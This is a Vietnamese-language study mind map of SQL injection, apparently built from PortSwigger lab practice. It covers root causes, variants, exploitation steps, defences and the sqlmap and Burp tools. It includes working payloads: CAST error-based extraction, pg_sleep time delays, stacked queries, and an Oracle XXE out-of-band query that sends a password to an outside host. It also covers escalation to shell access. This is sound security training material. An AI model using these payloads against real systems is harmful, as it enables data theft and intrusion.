# MIND MAP — SQL INJECTION (SQLi)

## NHÁNH 1 — BẢN CHẤT & ROOT CAUSE
- Định nghĩa
  - Lỗ hổng cho phép attacker chèn/sửa đổi câu lệnh SQL mà ứng dụng gửi tới database
  - Hệ quả: đọc/sửa/xóa dữ liệu ngoài phạm vi cho phép, bypass auth, đôi khi RCE
- Root cause
  - Input của user bị **nối chuỗi trực tiếp (string concatenation)** vào câu lệnh SQL
  - Input không được tách biệt giữa "data" và "code" → bị **diễn giải thành cú pháp SQL** (operator, keyword, statement terminator)
  - Ký tự đặc biệt (`'`, `"`, `;`, `--`, `/* */`) phá vỡ ranh giới string literal → chèn logic mới
- Component bị đánh lừa
  - **SQL parser / query engine của DBMS** (không phải web server, không phải application layer)
  - Parser không phân biệt được "chuỗi do dev viết" vs "chuỗi do input tạo ra" vì cả hai đến cùng một kênh văn bản thuần

---

## NHÁNH 2 — PHÂN LOẠI CÁC BIẾN THỂ (theo danh mục PortSwigger)
- **In-band — Retrieve hidden data**
  - Dấu hiệu: sửa logic `WHERE` để trả về dữ liệu ẩn
  - Điều kiện: kết quả query hiển thị trực tiếp trên response
- **In-band — UNION attack**
  - Dấu hiệu: dùng `UNION SELECT` để gộp thêm dữ liệu tùy ý vào output
  - Điều kiện: số cột + kiểu dữ liệu tương thích với query gốc, output hiển thị được
- **In-band — Login bypass**
  - Dấu hiệu: sửa logic điều kiện auth (`OR 1=1`)
  - Điều kiện: injection nằm trong query xác thực
- **Error-based (Visible error-based)**
  - Dấu hiệu: DB trả verbose error message chứa dữ liệu (qua `CAST()`/`CONVERT()` ép kiểu sai)
  - Điều kiện: ứng dụng không suppress lỗi DB, lỗi được trả về response
  - **Cơ chế CAST ép lỗi có chủ đích:** `AND 1=CAST((SELECT <cột> FROM <bảng> LIMIT 1) AS int)--`
    - Ép giá trị text (username/password...) sang kiểu `int` không tương thích → DB throw lỗi convert
    - Nhiều DB engine **in kèm chính giá trị gây lỗi** vào error message (VD Postgres: `invalid input syntax for type integer: "administrator"`) → biến lỗi thành **kênh rò rỉ dữ liệu**, không chỉ là tín hiệu true/false như Conditional Errors (Lab 12)
    - Khác biệt cốt lõi so với Conditional Errors: ở đây bạn **không quan tâm** biểu thức `1 = CAST(...)` đúng hay sai — mục tiêu là ép lỗi xảy ra để đọc nội dung, không phải để so sánh 2 trạng thái
    - Quy trình build payload incremental (dò cấu trúc query gốc qua chính error message): `'` → xác nhận injectable + lộ query gốc → `'--` → xác nhận lại cú pháp hợp lệ → `AND CAST((SELECT 1) AS int)` thiếu `=` → lộ ra `AND` cần biểu thức boolean → thêm `1=` → query hợp lệ, sẵn sàng nhét subquery thật
    - `LIMIT 1` vẫn cần thiết (giống Lab 11) để tránh lỗi "more than one row" che mất lỗi CAST thật sự muốn thấy
    - Giới hạn độ dài input (cookie/param) có thể cắt mất phần comment `--` khi payload dài → cần rút gọn phần giá trị gốc không cần thiết để nhường chỗ
    - **Bẫy thực chiến — DBMS không tự ép ngầm kiểu (implicit type coercion) như nhau:** PostgreSQL bắt buộc `AND` phải nhận đúng biểu thức kiểu `boolean` — `CAST(x AS int)` đơn thuần trả về `integer`, không tự động được hiểu là TRUE/FALSE (khác MySQL, nơi số khác 0 coi là TRUE) → bắt buộc phải viết `1=CAST(...)` để tạo ra biểu thức boolean hợp lệ, nếu không sẽ gặp lỗi cú pháp `argument of AND must be type boolean, not type integer`
    - **Bẫy gõ nhầm `''` (double single-quote):** trong SQL, `''` bên trong 1 string literal là ký tự escape cho 1 dấu nháy đơn thật, **không đóng chuỗi** — nếu vô tình gõ `''` thay vì `'` khi tách injection point, toàn bộ phần payload phía sau bị DB hiểu nhầm là văn bản nằm trong chuỗi (không phải cú pháp SQL) → tạo ra false positive (200 OK) dù payload chưa hề được thực thi đúng ý. Luôn kiểm tra tab **Raw** trong Burp để đếm chính xác số dấu nháy, đừng tin vào tab Pretty.
    - **DBMS fingerprint qua chữ ký lỗi:** PostgreSQL có định dạng lỗi đặc trưng `ERROR: <message>  Position: N` (khác Oracle `ORA-xxxxx`, MySQL "You have an error in your SQL syntax", MSSQL "Incorrect syntax near...") — dùng ngay error message đầu tiên để fingerprint DBMS, không cần đợi tới bước `version()`/`banner` riêng
- **Blind — Conditional responses (Boolean-based)**
  - Dấu hiệu: response khác biệt (nội dung/độ dài) giữa điều kiện TRUE/FALSE, không có error, không có data trực tiếp
  - Điều kiện: có thể inject điều kiện boolean vào query ảnh hưởng luồng hiển thị
- **Blind — Conditional errors**
  - Dấu hiệu: không có sự khác biệt nội dung, nhưng TRUE/FALSE tạo ra **HTTP status khác nhau** (200 vs 500) do query lỗi có chủ đích
  - Điều kiện: có thể trigger lỗi DB có điều kiện (`CASE WHEN ... THEN error ELSE ok END`)
- **Blind — Time delays**
  - Dấu hiệu: response time khác biệt dựa trên điều kiện (`pg_sleep`, `WAITFOR DELAY`, `dbms_pipe.receive_message`)
  - Điều kiện: không có bất kỳ side channel nào khác (không error, không content diff)
  - **Đã hoàn thành (PostgreSQL):** `x'||pg_sleep(10)--` — dùng `||` (string concat Postgres/Oracle, KHÔNG phải OR) để ép DB phải evaluate `pg_sleep()` như 1 phần bắt buộc của biểu thức, không cần so sánh đúng/sai
- **Blind — Time delays + information retrieval**
  - Dấu hiệu: dùng time-based làm oracle để leak từng ký tự dữ liệu
  - Điều kiện: cần điều kiện hóa delay theo giá trị ký tự đang test
  - **Đã thực hành (PostgreSQL) — stacked query + CASE WHEN:**
    - Cơ chế: `x';SELECT CASE WHEN (<đk>) THEN pg_sleep(N) ELSE pg_sleep(0) END FROM users--`
    - Dấu `;` mở **stacked query** — đóng hẳn câu SQL gốc, mở 1 câu SELECT hoàn toàn mới chạy tuần tự sau đó. Khác về bản chất so với `CASE WHEN` lồng trong `AND (...)` như Lab 12 (Oracle) — ở đó vẫn là 1 câu query duy nhất, còn đây là 2 câu lệnh riêng biệt được driver Postgres cho phép chạy nối tiếp.
    - **Bẫy quan trọng — dấu `;` bị chính tầng Cookie header nuốt mất, không phải do SQL:** Cookie header dùng `;` làm delimiter phân tách nhiều cặp `name=value`. Nếu gửi `;` sống (chưa encode `%3B`), parser cookie cắt đứt giá trị `TrackingId` ngay tại dấu `;` đó — toàn bộ phần payload phía sau (`SELECT CASE WHEN...`) **không bao giờ chạm tới SQL parser**, bị chặn đứng sớm hơn 1 tầng. Triệu chứng: mọi điều kiện (`1=1` lẫn `1=2`) đều phản hồi nhanh như nhau — vì thực chất chưa có gì được thực thi. Cách phát hiện: xem tab Raw, thấy `;` trần chưa được encode. Cách sửa: bôi đen toàn bộ payload rồi Ctrl+U đúng 1 lần để `;`→`%3B`, khoảng trắng→`+`.
- **Blind — Out-of-band interaction (OAST)**
  - Dấu hiệu: trigger DNS/HTTP lookup ra ngoài (Burp Collaborator) khi query chạy
  - Điều kiện: DB có function network (`UTL_HTTP`, `xp_dirtree`), không có side channel in-band nào khả dụng
- **Blind — Out-of-band data exfiltration**
  - Dấu hiệu: nhúng dữ liệu leak vào chính request OAST (subdomain, URL path)
  - Điều kiện: giống trên + có thể nối dữ liệu vào chuỗi gọi ra ngoài
  - **Đã hoàn thành (Oracle) — SQLi lồng XXE, xem LAB16_...md:**
    - Điều kiện đặc thù của lab: query chạy **async**, không ảnh hưởng response → mọi in-band channel (content/status/error/time) đều vô hiệu, kể cả time-based (khác Lab 14 — ở đó time-based còn dùng được vì query blocking response)
    - Oracle không có network function đơn giản như `xp_dirtree` (MSSQL) → phải mượn cơ chế **XXE** qua `EXTRACTVALUE(xmltype('<XML chứa external DTD entity SYSTEM "http://...">'),'/l')`
    - Cơ chế: khai báo `<!ENTITY % remote SYSTEM "http://...">` rồi gọi `%remote;` → ép XML parser của Oracle tự fetch URL ngay lúc parse → DB server tự làm HTTP/DNS client
    - **Kỹ thuật exfiltrate:** dùng `||` (concat Oracle) nối kết quả subquery **vào ngay trong URL bị gọi**: `"http://'||(SELECT password FROM users WHERE username='administrator')||'.SUBDOMAIN/"` → subdomain nhận được tại Collaborator chính là `<password>.<subdomain>` → đọc thẳng, không cần dò từng ký tự (1 request/giá trị, giống tốc độ Visible error-based Lab 18 nhưng qua kênh OOB)
    - **Bẫy thực chiến:** bôi đen sai vùng trước khi "Insert Collaborator payload" (bôi cả URL thay vì chỉ bôi đúng placeholder subdomain) → Burp thay thế đè lên, xóa mất đoạn `'||(SELECT password...)||'` → vẫn có interaction (chứng minh injectable) nhưng Host header chỉ có subdomain trơn, không leak được gì. Cách tránh: gõ payload với placeholder text trước, chỉ bôi đen chính xác placeholder rồi mới Insert.
    - Yêu cầu bắt buộc: Burp Suite Professional (Collaborator client không có ở Community)
- **Second-order SQL injection**
  - Dấu hiệu: payload lưu vào DB ở request A, kích hoạt injection ở request B (nơi giá trị được dùng lại trong query khác)
  - Điều kiện: có 2 điểm tách biệt — điểm lưu và điểm sử dụng lại dữ liệu trong query
- **SQLi filter bypass (WAF/input validation evasion)**
  - Dấu hiệu: input bị filter chặn từ khóa, nhưng vẫn bypass được qua encoding/case/comment trick
  - Điều kiện: filter dạng blocklist, không phải parameterized query

---

## NHÁNH 3 — QUY TRÌNH KHAI THÁC (từng bước)
- **Bước 1: Xác định điểm inject**
  - Test tất cả input surface: URL param, cookie, header (User-Agent, X-Forwarded-For), JSON/XML body, batch/search params
  - Payload dò: `'`, `''`, `\`, `;`, khoảng trắng bất thường → quan sát lỗi/thay đổi hành vi
- **Bước 2: Xác định loại/context**
  - String context (trong `'...'`) vs Numeric context (không quote) vs Identifier context (tên cột/bảng)
  - Câu query cho phép batched/stacked queries hay không (`;` có chạy statement thứ 2 không)
  - In-band (thấy data) hay Blind (không thấy gì) → quyết định kỹ thuật tiếp theo
- **Bước 3: Fingerprint môi trường**
  - DBMS type: dựa vào error message signature, comment syntax (`--` vs `#`), string concat (`||` Oracle/Postgres, `+` MSSQL, `CONCAT()` MySQL)
  - Version: `version()`, `banner` (Oracle `v$version`), `@@version` (MSSQL/MySQL)
  - Đặc thù DBMS: Oracle bắt buộc `FROM dual`, cần `ROWNUM` cho pagination-style subquery
- **Bước 4: Khai thác chính (leo thang)**
  - Detect: xác nhận injectable qua boolean/error/time oracle
  - Confirm & extract schema: liệt kê database, table, column (`information_schema` hoặc `all_tables`/`all_tab_columns` Oracle)
  - Extract data: đọc từng dòng/từng ký tự (UNION nếu in-band; brute-force nhị phân nếu blind)
  - Full impact / escalate: stacked queries → `xp_cmdshell` (MSSQL), `INTO OUTFILE` (MySQL), đọc file hệ thống → RCE nếu quyền DB cho phép

---

## NHÁNH 4 — PHÒNG CHỐNG (theo độ ưu tiên)
- **Giải pháp gốc rễ**
  - **Parameterized queries / Prepared statements (bind variables)**
  - **Tại sao hiệu quả về cơ chế:** DB driver gửi câu lệnh SQL và dữ liệu **qua hai kênh tách biệt ở tầng giao thức** (query plan compile trước, data bind sau) → input **không bao giờ được parser SQL đọc như cú pháp**, dù chứa `'`, `;`, hay bất kỳ ký tự đặc biệt nào. Đây là loại bỏ injection channel tận gốc, không phải "chặn" payload.
- **Giải pháp bổ sung (defense in depth)**
  - Least privilege cho DB account (không cấp quyền DDL/xp_cmdshell cho account ứng dụng)
  - Suppress verbose error message (ngăn error-based, nhưng KHÔNG chặn injection point — vẫn khai thác được qua blind/time/OOB)
  - Input validation / allowlist kiểu dữ liệu (bổ trợ, không thay thế parameterization)
  - WAF (chặn theo pattern, dễ bypass qua encoding/comment — chỉ là lớp chắn tạm thời)
  - ORM sử dụng đúng cách (vẫn có thể bị injection nếu dùng raw query/string building trong ORM)
- **So sánh cơ chế:**
  - WAF/input validation = blocklist theo pattern → bypass được bằng biến thể payload
  - Suppress error = chặn 1 side channel (error-based) → injection point vẫn tồn tại, chuyển sang blind/time/OOB
  - Parameterized query = loại bỏ khả năng parser hiểu nhầm data thành code → không có "biến thể payload" nào bypass được vì input không đi qua bước parse cú pháp

---

## NHÁNH 5 — TOOLING & TỐI ƯU THỜI GIAN
- **sqlmap**
  - `--technique=E` → error-based (khi có verbose error như lab "Visible error-based")
  - `--technique=B` → boolean blind
  - `--technique=T` → time-based blind
  - `--technique=U` → UNION-based
  - `--technique=S` → stacked queries
  - `--dbms=oracle` → skip fingerprint, dùng đúng syntax Oracle (`FROM dual`, `ROWNUM`) ngay từ đầu, giảm request thừa
  - `--risk`, `--level` → tăng độ sâu test (thêm payload, thêm vị trí header/cookie)
  - `--os-shell` → escalate lên RCE nếu quyền DB cho phép
- **Khi nào viết script Python riêng thay vì dùng tool**
  - Cần **binary search** thay vì linear brute-force của Intruder/sqlmap mặc định → giảm số request từ O(n) xuống O(log n) mỗi ký tự
  - Oracle conditional error cần logic `CASE WHEN` tùy biến không khớp pattern chuẩn của sqlmap
  - Cần custom side-channel (VD: OOB payload ghép dữ liệu vào subdomain) mà tool không hỗ trợ sẵn
  - Cần tốc độ cao qua async/concurrent requests, hoặc cần filter kết quả theo logic riêng
- **Burp Repeater**
  - Dùng để confirm thủ công từng bước: true/false, trigger error, đo response time baseline
  - Dùng để tinh chỉnh payload trước khi đưa vào Intruder (tránh brute-force sai cú pháp)
- **Burp Intruder**
  - **Sniper**: brute-force từng ký tự tại 1 vị trí (VD: password character-by-character)
  - **Cluster bomb**: khi cần test nhiều vị trí độc lập cùng lúc (VD: position + character)
  - Filter kết quả: theo **status code** (conditional errors), theo **response length/Grep-Match keyword** (boolean-based), theo **response time** (time-based, cần đọc cột "Response received" hoặc dùng Turbo Intruder cho chính xác hơn)
- **Resource pool — bắt buộc cho time-based Intruder (bài học thực chiến):**
  - **Vì sao cần:** với oracle dạng nội dung/status (Lab 11/12), nhiều request chạy song song vẫn tự chứa đúng tín hiệu riêng của nó, không ảnh hưởng nhau. Nhưng với oracle dạng **thời gian**, nếu nhiều request "true" (đang sleep) chạy đồng thời, chúng tranh chấp connection/CPU ở DB → các sleep bị xếp hàng chồng lên nhau → thời gian đo được bị nhiễu, không còn phản ánh đúng 1 request = 1 lần sleep → dễ đọc sai kết quả (VD thực tế: dùng `pg_sleep(5)` mặc định 10 thread, ra tới 7 dòng "true" thay vì đúng 1 ranh giới).
  - **Cách sửa:** tab Resource pool → Create new resource pool → tick "Maximum concurrent requests" = **1** → gán attack vào pool này. Sau khi ép single-thread, kết quả sạch lại ngay dù giữ nguyên giá trị sleep.
  - **Đánh đổi tốc độ:** sleep càng lớn → kết quả càng dễ phân biệt khỏi baseline nhưng attack càng chậm. Có thể giảm sleep xuống mức vừa đủ lớn hơn baseline một khoảng an toàn (VD baseline ~1.3s thì dùng `pg_sleep(5)` là đủ, không cần giữ nguyên 10) — miễn đã single-thread thì sleep ngắn vẫn cho kết quả sạch, giúp giảm đáng kể tổng thời gian chạy so với dùng 10s.
- **So sánh tốc độ extract dữ liệu giữa các kỹ thuật blind/error**
  - Boolean-based / Conditional errors: đọc được **1 bit/request** → cần dò từng ký tự bằng Intruder (VD 20 ký tự × 36 giá trị = 720 request)
  - Visible error-based (CAST): đọc được **nguyên 1 giá trị/request** (toàn bộ chuỗi text lộ ra trong error message) → không cần Intruder brute-force ký tự, nhanh hơn hẳn về số lượng request cần gửi

---

## NHÁNH 6 — CÂU HỎI TỰ KIỂM TRA
1. Vì sao thêm `--` hoặc `#` sau payload lại vô hiệu hóa phần query còn lại thay vì gây lỗi cú pháp?
2. Vì sao ép kiểu sai bằng `CAST()`/`CONVERT()` có thể biến một lỗ hổng blind SQLi thành visible (error-based)?
3. Vì sao parameterized query chặn được injection ở **tầng giao thức DB driver**, chứ không phải chỉ "lọc ký tự" ở tầng ứng dụng?
4. Vì sao chỉ fix error handling (suppress verbose error) là **không đủ** để vá lỗ hổng — injection point còn tồn tại theo hướng nào?
5. Vì sao UNION-based attack bắt buộc phải xác định đúng **số cột** và **kiểu dữ liệu tương thích** với query gốc trước khi extract data?
6. Vì sao kỹ thuật `CAST(text AS int)` chỉ hoạt động được nếu ứng dụng **không suppress verbose error message** ở tầng production — và điều đó nói lên gì về mối quan hệ giữa "ẩn lỗi chi tiết" và "vá lỗ hổng SQLi tận gốc"?
7. Vì sao Visible error-based đọc được nguyên 1 giá trị/request trong khi Boolean-based và Conditional errors chỉ đọc được 1 bit/request — sự khác biệt này nằm ở đâu trong cơ chế oracle của mỗi loại?
8. Vì sao việc DBMS có tự ép ngầm kiểu dữ liệu (implicit type coercion, VD int→boolean) hay không lại ảnh hưởng trực tiếp tới cú pháp payload CAST — và vì sao không thể áp dụng y nguyên 1 payload CAST giữa các DBMS khác nhau dù cùng ý tưởng khai thác?
9. Vì sao lỗi cú pháp do gõ nhầm (VD `''` thay vì `'`) có thể tạo ra kết quả 200 OK trông giống hệt như 1 payload hợp lệ thành công — và điều gì buộc bạn phải luôn xác minh ở tầng ký tự thô (Raw), không chỉ tin vào status code?
10. Vì sao dấu `;` trong payload stacked query bị cắt mất bởi chính tầng Cookie header (không phải do SQL parser) nếu chưa encode thành `%3B` — và tại sao triệu chứng của lỗi này (mọi điều kiện đều phản hồi nhanh như nhau) dễ khiến người mới nhầm là "injection point sai" thay vì "encode sai"?
11. Vì sao Intruder chạy đa luồng (mặc định) lại phá vỡ độ tin cậy của oracle dạng thời gian, trong khi hoàn toàn không ảnh hưởng gì tới oracle dạng nội dung (`Welcome back`) hay status code — sự khác biệt nằm ở bản chất "tín hiệu" của mỗi loại oracle là gì?
12. Vì sao time-based blind SQLi được xem là kỹ thuật "cuối cùng" trong thứ tự ưu tiên khai thác (chỉ dùng khi Boolean-based/Error-based đều không khả dụng) — xét trên 2 khía cạnh: tốc độ extract dữ liệu và độ tin cậy của tín hiệu?
13. Vì sao ngay cả time-based (kỹ thuật "cuối cùng" ở Lab 14) vẫn thất bại khi query được thực thi **bất đồng bộ (async)** so với response — điều gì trong cơ chế đo lường của time-based phụ thuộc vào tính đồng bộ (blocking) này?
14. Vì sao phải "mượn" 1 lỗ hổng khác (XXE) để tạo ra network call trong SQLi OOB, thay vì DBMS nào cũng có sẵn hàm SQL đơn giản để tự gọi ra ngoài — sự khác biệt về network function build-in giữa Oracle/MSSQL/MySQL/Postgres nói lên điều gì về "bề mặt tấn công" đặc thù của từng DBMS?
15. Vì sao toán tử nối chuỗi (`||`, `+`, `CONCAT()`) lại là mấu chốt biến 1 OOB interaction "chỉ chứng minh injectable" thành 1 kênh "exfiltrate được dữ liệu thật" — nếu thiếu bước nối chuỗi này, request ra Collaborator còn chứng minh được gì và mất đi khả năng gì?

---

## LAB TƯƠNG ỨNG THEO NHÁNH 2 (sắp xếp độ khó tăng dần)

**In-band — Retrieve hidden data / Login bypass**
1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
2. SQL injection vulnerability allowing login bypass

**In-band — UNION attack**
3. SQL injection UNION attack, determining the number of columns returned by the query
4. SQL injection UNION attack, finding a column containing text
5. SQL injection UNION attack, retrieving data from other tables
6. SQL injection UNION attack, retrieving multiple values in a single column

**Fingerprinting (bổ trợ cho mọi nhánh)**
7. SQL injection attack, querying the database type and version on Oracle
8. SQL injection attack, querying the database type and version on MySQL and Microsoft
9. SQL injection attack, listing the database contents on non-Oracle databases
10. SQL injection attack, listing the database contents on Oracle

**Error-based**
11. SQL injection with filter bypass via XML encoding
12. Visible error-based SQL injection ← *đã hoàn thành (PostgreSQL, xem LAB18_...md)*

**Blind — Conditional responses**
13. Blind SQL injection with conditional responses ← *đã hoàn thành (xem LAB_11_...md)*

**Blind — Conditional errors**
14. Blind SQL injection with conditional errors ← *đã hoàn thành (Oracle, xem LAB12_...md)*

**Blind — Time delays**
15. Blind SQL injection with time delays ← *đã hoàn thành (PostgreSQL, `x'||pg_sleep(10)--`)*
16. Blind SQL injection with time delays and information retrieval ← *đang thực hiện (PostgreSQL, stacked query + CASE WHEN, xem LAB14_...md)*

**Blind — Out-of-band**
17. Blind SQL injection with out-of-band interaction
18. Blind SQL injection with out-of-band data exfiltration ← *đã hoàn thành (Oracle, SQLi+XXE, xem LAB16_...md)*

**Second-order**
19. Second-order SQL injection
